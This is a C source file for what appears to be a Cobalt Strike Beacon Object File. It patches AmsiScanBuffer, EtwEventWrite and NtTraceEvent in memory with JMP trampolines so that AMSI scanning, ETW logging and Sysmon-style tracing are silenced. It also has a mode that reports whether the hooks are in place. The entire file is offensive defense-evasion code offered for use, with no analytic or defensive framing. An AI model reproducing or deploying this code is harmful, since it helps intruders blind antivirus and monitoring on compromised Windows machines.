#include <windows.h>
#include "beacon.h"

#define NT_SUCCESS 0x00000000
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$memcmp (void*, void*, size_t);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

unsigned char originalEtw[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58 };
unsigned char originalNtTrace[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x38 };

void trampolinePatch(const char* moduleName, const char* functionName, const char* desc) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting trampoline patch for %s...\n", desc);
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not get module handle for %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not get address of %s\n", functionName);
        return;
    }

    SIZE_T patchLen = 12;
    BYTE trampolineCode[32] = {0};

    PVOID trampoline = NULL;
    SIZE_T regionSize = 0x1000;
    NTSTATUS status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), &trampoline, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != NT_SUCCESS || trampoline == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtAllocateVirtualMemory failed for trampoline\n");
        return;
    }

    for (int i = 0; i < patchLen; i++) {
        ((BYTE*)trampoline)[i] = target[i];
    }

    BYTE jmpBack[5] = { 0xE9 };
    DWORD rel = (DWORD)((BYTE*)target + patchLen - ((BYTE*)trampoline + patchLen + 5));
    *((DWORD*)&jmpBack[1]) = rel;
    for (int i = 0; i < 5; i++) {
        ((BYTE*)trampoline)[patchLen + i] = jmpBack[i];
    }

    BYTE patch[5] = { 0xE9 };
    DWORD relPatch = (DWORD)((BYTE*)trampoline - (target + 5));
    *((DWORD*)&patch[1]) = relPatch;

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = 5;

    status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory failed\n");
        return;
    }

    status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), target, patch, sizeof(patch), NULL);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtWriteVirtualMemory failed\n");
        return;
    }

    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trampoline patch applied to %s\n", desc);
}

void patchAmsi() {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting AMSI patch...\n");
    KERNEL32$LoadLibraryA("amsi.dll");
    trampolinePatch("amsi.dll", "AmsiScanBuffer", "AMSI");
}

void patchEtw() {
    trampolinePatch("ntdll.dll", "EtwEventWrite", "ETW");
}

void patchSysmon() {
    trampolinePatch("ntdll.dll", "NtTraceEvent", "NtTraceEvent (Sysmon)");
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);

    if (cmd == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Patching AMSI, ETW and Sysmon using trampoline hooks...\n");
        patchAmsi();
        patchEtw();
        patchSysmon();
    } else if (cmd == 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Patching AMSI only...\n");
        patchAmsi();
    } else if (cmd == 2) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Patching ETW only...\n");
        patchEtw();
    } else if (cmd == 3) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Patching NtTraceEvent only...\n");
        patchSysmon();
    } else if (cmd == 4) {
        void* etw = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
        void* nttrace = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
        void* amsi = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("amsi.dll"), "AmsiScanBuffer");

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking patch status for known hooks...\n");

        if (etw) {
            if (((BYTE*)etw)[0] == 0xE9) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] EtwEventWrite is patched (starts with JMP)\n");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] EtwEventWrite is likely clean (starts with: %02X %02X %02X)\n", ((BYTE*)etw)[0], ((BYTE*)etw)[1], ((BYTE*)etw)[2]);
            }
        }

        if (nttrace) {
            if (((BYTE*)nttrace)[0] == 0xE9) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] NtTraceEvent is patched (starts with JMP)\n");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] NtTraceEvent is likely clean (starts with: %02X %02X %02X)\n", ((BYTE*)nttrace)[0], ((BYTE*)nttrace)[1], ((BYTE*)nttrace)[2]);
            }
        }

        if (amsi) {
            if (((BYTE*)amsi)[0] == 0xE9) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBuffer is patched (starts with JMP)\n");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] AmsiScanBuffer is likely clean (starts with: %02X %02X %02X)\n", ((BYTE*)amsi)[0], ((BYTE*)amsi)[1], ((BYTE*)amsi)[2]);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] AmsiScanBuffer not found or amsi.dll not loaded\n");
        }
    }
}
